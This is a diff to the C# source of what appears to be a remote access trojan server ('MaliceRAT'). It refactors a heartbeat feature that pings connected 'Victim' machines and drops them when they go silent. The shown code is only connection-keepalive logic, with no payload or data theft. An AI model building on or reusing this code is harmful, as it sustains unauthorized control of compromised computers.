@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Net.Sockets;
 using System.Timers;
+using System.Web.Script.Serialization;
 using System.Threading.Tasks;
 
 namespace MaliceRAT.RatServer.Features
@@ -18,11 +19,12 @@ namespace MaliceRAT.RatServer.Features
             this.interval = interval;
             this.server = server;
             heartbeatTimer = new Timer(interval);
+            server.MessageReceived += HandleMessage;
         }
         #endregion
 
         #region Methods
-        public void StartHeartbeat(NetworkStream stream, Victim client)
+        public void StartHeartbeat(NetworkStream stream, Victim victim)
         {
             heartbeatTimer.Elapsed += async (sender, e) =>
             {
@@ -30,11 +32,11 @@ namespace MaliceRAT.RatServer.Features
                 {
                     heartbeatTimer.Stop();
                     stream.Close();
-                    server.OnClientDisconnected(client);
+                    server.OnClientDisconnected(victim);
                     return;
                 }
                 heartbeatReceived = false;
-                await SendHeartbeat(stream, client);
+                await SendHeartbeat(stream, victim);
             };
             heartbeatTimer.Start();
         }
@@ -44,16 +46,20 @@ namespace MaliceRAT.RatServer.Features
             heartbeatTimer.Stop();
         }
 
-        public void ReceiveHeartbeat()
+        private void HandleMessage(Victim victim, dynamic jsonMessage)
         {
-            heartbeatReceived = true;
+            if (jsonMessage["type"] == "heartbeat")
+            {
+                heartbeatReceived = true;
+            }
         }
 
-        private async Task SendHeartbeat(NetworkStream stream, Victim client)
+        private async Task SendHeartbeat(NetworkStream stream, Victim victim)
         {
-            string heartbeatMessage = "{\"type\":\"heartbeat\"}";
-            byte[] data = System.Text.Encoding.UTF8.GetBytes(heartbeatMessage);
-            await stream.WriteAsync(data, 0, data.Length);
+            if (stream != null && stream.CanWrite)
+            {
+                await victim.SendAsync(new { type = "heartbeat", text = "ping" });
+            }
         }
         #endregion
     }
